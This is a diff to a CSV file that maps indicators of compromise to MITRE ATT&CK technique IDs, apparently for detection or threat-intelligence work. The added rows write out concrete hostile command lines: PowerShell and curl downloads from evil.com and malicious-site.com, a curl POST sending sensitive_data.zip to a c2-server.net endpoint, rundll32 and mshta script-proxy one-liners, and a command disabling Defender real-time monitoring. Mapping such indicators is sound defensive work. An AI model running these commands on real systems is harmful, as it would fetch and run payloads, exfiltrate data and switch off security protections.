@@ -1,4 +1,9 @@
 IOC Summary,Technique ID,Mapped Technique,Tactic
-powershell downloading exe file,T1059,Command and Scripting Interpreter,Execution
-curl http://malicious-site.com,T1105,Ingress Tool Transfer,Command and Control
-rundll32 executing script,T1218,Signed Binary Proxy Execution,Defense Evasion
+powershell -enc Base64EncodedPayload downloading exe file from 192.168.1.50,T1059,Command and Scripting Interpreter,Execution
+curl http://malicious-site.com/payload.bin -o C:\Temp\update.exe,T1105,Ingress Tool Transfer,Command and Control
+rundll32 executing script from AppData\Local\Temp\malware.dll,T1218,Signed Binary Proxy Execution,Defense Evasion
+powershell Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\Users\Public\shell.ps1,T1059,Command and Scripting Interpreter,Execution
+curl -X POST http://c2-server.net/exfil --data @sensitive_data.zip,T1105,Ingress Tool Transfer,Command and Control
+"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication"";document.write()",T1218,Signed Binary Proxy Execution,Defense Evasion
+powershell Set-MpPreference -DisableRealtimeMonitoring $true,T1059,Command and Scripting Interpreter,Execution
+"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -ep bypass"""", 0:close"")",T1059,Command and Scripting Interpreter,Execution
